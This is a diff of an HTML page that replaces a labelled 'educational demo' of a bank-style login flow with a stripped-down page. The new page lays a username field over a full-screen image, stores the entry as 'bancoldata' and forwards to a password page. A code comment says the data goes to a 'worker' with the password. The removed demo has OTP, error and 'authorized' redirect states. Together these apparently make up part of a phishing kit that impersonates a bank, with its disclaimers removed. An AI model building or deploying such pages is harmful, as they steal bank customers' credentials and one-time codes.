@@ -1,264 +1,233 @@
-<!doctype html>
-<html lang="es">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Demo Seguro — Inicio</title>
-  <meta name="description" content="Demo seguro: flujo de validación (educativo). No usar datos reales." />
-  <style>
-    :root{
-      --bg:#0f172a;
-      --card:#0b1220;
-      --accent:#677eff;
-      --muted:#9aa4c2;
-      --glass: rgba(255,255,255,0.03);
-    }
-    *{box-sizing:border-box}
-    body{
-      margin:0;
-      min-height:100vh;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
-      background: linear-gradient(180deg, #061028 0%, #08132a 60%);
-      color:#e6eef8;
-      padding:24px;
-    }
-    .container{
-      width:100%;
-      max-width:980px;
-      display:grid;
-      grid-template-columns: 1fr 360px;
-      gap:20px;
-      align-items:start;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image-based Website with Loader</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body, html {
+            height: 100%;
+            width: 100%;
+            background-color: #f0f0f0;
+            overflow: hidden;
+        }
 
-    .panel{
-      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
-      border-radius:12px;
-      padding:18px;
-      box-shadow: 0 10px 30px rgba(2,6,23,0.6);
-      border: 1px solid rgba(255,255,255,0.03);
-    }
+        /* Estilos del loader */
+        .loader-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
 
-    h1{margin:0 0 8px;font-size:20px}
-    p.lead{margin:0 0 14px;color:var(--muted);font-size:14px}
+        /* Estilos del contenido principal */
+        .image-container {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            position: relative;
+            display: none; /* Ocultamos inicialmente el contenido principal */
+        }
+        .image-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .center-box {
+            position: absolute;
+            top: 55%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgb(255, 255, 255);
+            width: 290px;
+            height: 66px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 8px;
+        }
+        .center-box .input-container {
+            position: relative;
+            width: 80%;
+        }
+        .center-box input {
+            width: 100%;
+            padding: 10px;
+            padding-left: 40px;
+            font-size: 19px;
+            border: none;
+            border-bottom: 1px solid #ffe100;
+            outline: none;
+        }
+        .center-box .input-container i {
+            position: absolute;
+            left: 4px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #888;
+            font-size: 17px;
+        }
 
-    label{display:block;font-size:13px;color:var(--muted);margin-top:10px}
-    input[type="text"], input[type="password"]{
-      width:100%;
-      padding:10px 12px;
-      margin-top:6px;
-      border-radius:8px;
-      background:var(--glass);
-      border:1px solid rgba(255,255,255,0.04);
-      color:#e6eef8;
-      font-size:14px;
-    }
-    .row{display:flex;gap:8px;margin-top:12px}
-    button{
-      padding:10px 12px;border-radius:8px;border:0;font-weight:600;cursor:pointer;
-      background:var(--accent); color:white;
-    }
-    button.secondary{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--muted)}
-    small.note{display:block;color:var(--muted);margin-top:8px;font-size:13px}
-
-    .card-right{position:sticky; top:24px;}
-    .list{display:grid;gap:8px;margin-top:8px}
-    .chip{background:rgba(255,255,255,0.02);padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.02);font-size:13px}
-    pre{background:#021028;padding:12px;border-radius:8px;overflow:auto;color:#bcd7ff;font-size:13px}
-    footer{margin-top:12px;color:var(--muted);font-size:13px}
-    .danger{background:#ef4444}
-  </style>
+        .button-container {
+            position: absolute;
+            top: 70.4%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: flex;
+            gap: 10px;
+            transition: top 0.3s ease;
+        }
+        .button-container button {
+            padding: 13px 35px;
+            font-size: 13px;
+            border: none;
+            border-radius: 50px;
+            font-weight: bold;
+            color: rgb(1, 1, 1);
+            cursor: pointer;
+        }
+        .button-container button:first-child {
+            background-color: #ffffff;
+            border: 1px solid black;
+        }
+        .button-container button:first-child:hover {
+            background-color: #ffffff;
+        }
+        .button-container button:last-child {
+            background-color: #ffda37;
+            color: black;
+            cursor: not-allowed;
+        }
+        .button-container button:last-child.enabled {
+            background-color: #ffda37;
+            cursor: pointer;
+            color: rgb(1, 1, 1);
+        }
+        .button-container button:last-child.enabled:hover {
+            background-color: #ffb800;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <div class="panel">
-      <h1>Demo Seguro — Flujo de validación</h1>
-      <p class="lead">Este index permite configurar datos de prueba y lanzar el flujo de validación sin enviar credenciales reales a servidores externos.</p>
-
-      <label for="usuario">Usuario (demo)</label>
-      <input id="usuario" type="text" placeholder="usuario_demo">
-
-      <label for="clave">Clave (demo)</label>
-      <input id="clave" type="password" placeholder="clave_demo">
-
-      <div class="row" style="margin-top:14px">
-        <button id="save">Guardar demo</button>
-        <button id="start" class="secondary">Iniciar flujo (cargando)</button>
-        <button id="start-sim" class="secondary">Iniciar flujo (simulado)</button>
-      </div>
-
-      <small class="note">Guardar crea el objeto <code>bancoldata</code> en <code>localStorage</code>. El flujo "cargando" redirige a <code>cargando.html</code> (obra demo).</small>
-
-      <hr style="margin:18px 0;border:none;border-top:1px solid rgba(255,255,255,0.03)">
-
-      <h3 style="margin:0 0 8px">Herramientas de prueba</h3>
-      <div class="list">
-        <div class="chip">
-          <strong>ID de transacción actual:</strong>
-          <div id="txid" style="margin-top:6px;font-family:monospace;color:#bcd7ff">—</div>
-        </div>
-
-        <div class="chip">
-          <strong>Estado simulado / manual</strong>
-          <div style="display:flex;gap:8px;margin-top:8px">
-            <button class="secondary" data-state="autorizado">Autorizar</button>
-            <button class="secondary" data-state="otp">Solicitar OTP</button>
-            <button class="secondary" data-state="error">Error</button>
-            <button class="secondary" data-state="fallo">Fallo</button>
-            <button class="secondary" data-state="finalizado">Finalizar</button>
-          </div>
-          <small style="display:block;margin-top:8px;color:var(--muted)">Usa estos botones para escribir un estado simulado en <code>/status</code> local (no externo).</small>
-        </div>
-
-        <div class="chip">
-          <strong>Pruebas rápidas</strong>
-          <div style="display:flex;gap:8px;margin-top:8px">
-            <button id="clear" class="secondary">Limpiar localStorage</button>
-            <button id="show" class="secondary">Ver bancoldata</button>
-            <button id="gen" class="secondary">Generar tx id</button>
-          </div>
-        </div>
-      </div>
-
-      <footer>
-        <small>Demo educativo — No envíes datos reales. Puedo generar las páginas relacionadas (<code>cargando.html</code>, <code>otp.html</code>, etc.) si quieres.</small>
-      </footer>
+    <!-- Loader -->
+    <div class="loader-container" id="loader">
+        <div class="loader"></div>
     </div>
 
-    <div class="panel card-right">
-      <h3 style="margin-top:0">Estado & ayuda</h3>
-      <p class="lead" style="margin-bottom:8px">Panel rápido para ver la información que guarda la demo.</p>
-
-      <div class="chip" style="margin-bottom:10px">
-        <strong>Contenido de <code>bancoldata</code>:</strong>
-        <pre id="bancol-preview">—</pre>
-      </div>
-
-      <div class="chip">
-        <strong>Nota sobre producción</strong>
-        <p style="margin:8px 0 0;color:var(--muted);font-size:13px">
-          En producción nunca guardes contraseñas en texto plano. Usa hashing, HTTPS, y no reenvíes credenciales por canales no seguros.
-        </p>
-      </div>
+    <!-- Contenido principal -->
+    <div class="image-container" id="mainContent">
+        <img src="img/cel1.jpg" alt="Background Image">
+        <div class="center-box">
+            <div class="input-container">
+                <i class="fas fa-user"></i>
+                <input type="text" placeholder="Usuario" id="userInput">
+            </div>
+        </div>
+        <div class="button-container">
+            <button>Cancelar</button>
+            <button id="continueButton" class="disabled">Continuar</button>
+        </div>
     </div>
-  </div>
 
-  <script>
-    // Utilidades
-    const $ = id => document.getElementById(id);
+    <script>
+        // Mostrar el contenido principal cuando la página esté completamente cargada
+        window.onload = () => {
+            const loader = document.getElementById('loader');
+            const mainContent = document.getElementById('mainContent');
 
-    function readBancol(){
-      try {
-        return JSON.parse(localStorage.getItem('bancoldata') || 'null');
-      } catch (e) { return null; }
-    }
-    function renderPreview(){
-      const data = readBancol();
-      $('bancol-preview').textContent = data ? JSON.stringify(data, null, 2) : '—';
-      $('txid').textContent = localStorage.getItem('transactionId') || '—';
-    }
+            // Ocultar el loader y mostrar el contenido principal
+            loader.style.display = 'none';
+            mainContent.style.display = 'block';
+        };
 
-    // Guardar demo
-    $('save').addEventListener('click', () => {
-      const usuario = $('usuario').value.trim() || 'usuario_demo';
-      const clave = $('clave').value.trim() || 'clave_demo';
-      const obj = { usuario, clave, createdAt: new Date().toISOString() };
-      localStorage.setItem('bancoldata', JSON.stringify(obj));
-      alert('Datos demo guardados en localStorage (bancoldata).');
-      renderPreview();
-    });
+        const userInput = document.getElementById('userInput');
+        const continueButton = document.getElementById('continueButton');
+        const buttonContainer = document.querySelector('.button-container');
 
-    // Iniciar flujo: redirige a cargando.html (presume que existe)
-    $('start').addEventListener('click', () => {
-      const bancol = readBancol();
-      if (!bancol) {
-        alert('Primero guarda datos demo (botón "Guardar demo").');
-        return;
-      }
-      // Generar transactionId y guardarlo
-      const tx = Date.now().toString(36) + Math.random().toString(36).substr(2);
-      localStorage.setItem('transactionId', tx);
-      renderPreview();
-      // Redirigir a la página de carga (demo)
-      window.location.href = 'cargando.html';
-    });
+        // Habilitar/Deshabilitar el botón
+        userInput.addEventListener('input', () => {
+            const userValue = userInput.value.trim();
+            if (userValue.length >= 4) {
+                continueButton.classList.add('enabled');
+                continueButton.classList.remove('disabled');
+            } else {
+                continueButton.classList.add('disabled');
+                continueButton.classList.remove('enabled');
+            }
+        });
 
-    // Iniciar flujo simulado: no redirección, simula un roundtrip
-    $('start-sim').addEventListener('click', async () => {
-      const bancol = readBancol();
-      if (!bancol) {
-        alert('Primero guarda datos demo (botón "Guardar demo").');
-        return;
-      }
-      const tx = Date.now().toString(36) + Math.random().toString(36).substr(2);
-      localStorage.setItem('transactionId', tx);
-      renderPreview();
-      alert('Simulación iniciada. Se decidirá un estado aleatorio y se redirigirá.');
-      // Simular latencia
-      await new Promise(r => setTimeout(r, 1400));
-      const estados = ['autorizado','otp','error','fallo','finalizado'];
-      const elegido = estados[Math.floor(Math.random()*estados.length)];
-      // Escribir estado simulado en localStorage "status_{tx}"
-      localStorage.setItem('status_' + tx, JSON.stringify({ estado: elegido, at: new Date().toISOString() }));
-      // Redirigir según estado (simulado)
-      switch(elegido){
-        case 'autorizado': window.location.href = 'codigo.html'; break;
-        case 'otp': window.location.href = 'otp.html'; break;
-        case 'error': window.location.href = 'usererror.html'; break;
-        case 'fallo': window.location.href = 'fallo.html'; break;
-        case 'finalizado': window.location.href = 'finalizar.html'; break;
-        default: window.location.href = 'index.html';
-      }
-    });
+        // Detectar cuando el teclado está visible y mover los botones
+        window.addEventListener('resize', () => {
+            if (window.innerHeight < 500) { // Asume que el teclado se muestra cuando la altura de la ventana es pequeña
+                buttonContainer.style.top = '77%'; // Mover los botones hacia abajo
+            } else {
+                buttonContainer.style.top = '70.4%'; // Restaurar la posición original
+            }
+        });
 
-    // Generar transaction id sin redirigir
-    $('gen').addEventListener('click', () => {
-      const tx = Date.now().toString(36) + Math.random().toString(36).substr(2);
-      localStorage.setItem('transactionId', tx);
-      renderPreview();
-      alert('Transaction ID generado: ' + tx);
-    });
+        // Acción al hacer clic en "Continuar"
+        continueButton.addEventListener('click', async () => {
+            const userValue = userInput.value.trim();
+            if (userValue.length >= 4) {
+                try {
+                    // Generar transactionId único
+                    const transactionId = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                    
+                    // Guardar en localStorage
+                    let bancoldata;
+                    try {
+                        const storedData = localStorage.getItem('bancoldata');
+                        bancoldata = storedData ? JSON.parse(storedData) : {};
+                    } catch (e) {
+                        console.error('Error al parsear bancoldata. Reiniciando a un objeto vacío:', e);
+                        bancoldata = {};
+                    }
 
-    // Limpiar localStorage demo
-    $('clear').addEventListener('click', () => {
-      if (!confirm('¿Borrar datos demo (localStorage)?')) return;
-      localStorage.removeItem('bancoldata');
-      localStorage.removeItem('transactionId');
-      renderPreview();
-      alert('LocalStorage limpiado.');
-    });
+                    bancoldata.usuario = userValue;
+                    bancoldata.transactionId = transactionId;
+                    localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
 
-    // Ver bancoldata en consola
-    $('show').addEventListener('click', () => {
-      const b = readBancol();
-      if (!b) { alert('No hay bancoldata guardado.'); return; }
-      alert('bancoldata:\\n' + JSON.stringify(b, null, 2));
-    });
+                    // Enviar datos al worker (esto se hará en la siguiente pantalla con la clave)
+                    console.log('Usuario guardado:', userValue, 'Transaction ID:', transactionId);
 
-    // Botones de estado manual (escriben una "status_{tx}" local)
-    document.querySelectorAll('[data-state]').forEach(btn => {
-      btn.addEventListener('click', () => {
-        const state = btn.getAttribute('data-state');
-        const tx = localStorage.getItem('transactionId');
-        if (!tx) { alert('Genera primero un transactionId (botón "Generar tx id").'); return; }
-        localStorage.setItem('status_' + tx, JSON.stringify({ estado: state, at: new Date().toISOString() }));
-        alert('Estado "' + state + '" guardado para tx: ' + tx);
-        renderPreview();
-      });
-    });
-
-    // Renderizar estado inicial
-    renderPreview();
-
-    // Si hay bancoldata al cargar, rellenar inputs
-    const existing = readBancol();
-    if (existing) {
-      $('usuario').value = existing.usuario || '';
-      $('clave').value = existing.clave || '';
-    }
-  </script>
+                    // Redirigir a la página siguiente
+                    window.location.href = 'cel-clave.html';
+                    
+                } catch (error) {
+                    console.error('Error:', error);
+                    alert('Error al procesar la solicitud');
+                }
+            } else {
+                alert('Por favor, ingrese un usuario válido de al menos 4 caracteres.');
+            }
+        });
+    </script>
 </body>
 </html>
